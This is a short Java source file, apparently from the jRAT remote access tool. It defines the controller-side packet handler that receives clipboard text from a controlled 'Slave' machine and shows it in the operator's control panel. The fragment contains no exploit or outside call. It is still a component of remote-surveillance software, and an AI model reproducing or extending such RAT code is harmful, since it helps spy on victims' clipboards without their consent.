package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameControlPanel;
import io.jrat.client.ui.panels.PanelControlClipboard;

import java.io.DataInputStream;


public class Packet41Clipboard extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String content = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlClipboard panel = (PanelControlClipboard) frame.panels.get("clipboard");
			panel.getPane().setText(content);
		}
	}

}
